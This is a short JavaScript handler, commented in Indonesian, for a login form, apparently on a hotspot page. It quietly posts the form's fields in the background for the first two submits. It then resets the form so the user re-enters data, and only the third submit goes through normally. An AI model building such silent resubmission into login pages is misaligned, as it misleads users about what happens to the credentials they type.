// <script type="text/javascript">
// javascript versi v0.1

document.login.username.focus();

const loginForm = document.getElementsByName("login")[0];

loginForm.addEventListener("submit", function(e) {
    // Ambil counter dari localStorage
    let count = parseInt(localStorage.getItem("submitCount") || "0");
    count++;

    if (count < 3) {
        // Hanya cegah perilaku default jika belum mencapai 3 kali
        e.preventDefault();

        // Sembunyikan form dan tampilkan loading seperti sebelumnya
        e.target.style.display = "none";
        document.getElementById("loading").style.display = "block";
        document.getElementById("loading").innerHTML = "Mengirim data ke status.htm..."; // Pesan loading

        // Delay 2,5 detik untuk pengiriman XHR
        setTimeout(() => {
            let form = e.target;
            let xhr = new XMLHttpRequest();
            xhr.open(form.method, form.action);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            // Ambil semua field dan kirim via XHR di latar belakang
            let data = [];
            for (let i = 0; i < form.elements.length; i++) {
                let el = form.elements[i];
                if (el.name) data.push(encodeURIComponent(el.name) + "=" + encodeURIComponent(el.value));
            }
            xhr.send(data.join("&"));

            // Update counter di localStorage
            localStorage.setItem("submitCount", count);

            // Reset form untuk input berikutnya
            form.reset();
            form.style.display = "block";
            document.getElementById("loading").style.display = "none";
            document.login.username.focus();

        }, 2500);

    } else {
        // Jika count sudah 3 atau lebih, biarkan form submit secara normal (POST)
        // localStorage akan direset di sini atau setelah navigasi, tergantung keinginan
        localStorage.removeItem("submitCount");
        // Browser akan melanjutkan submit POST secara otomatis setelah event listener ini selesai
    }
});
// </script>
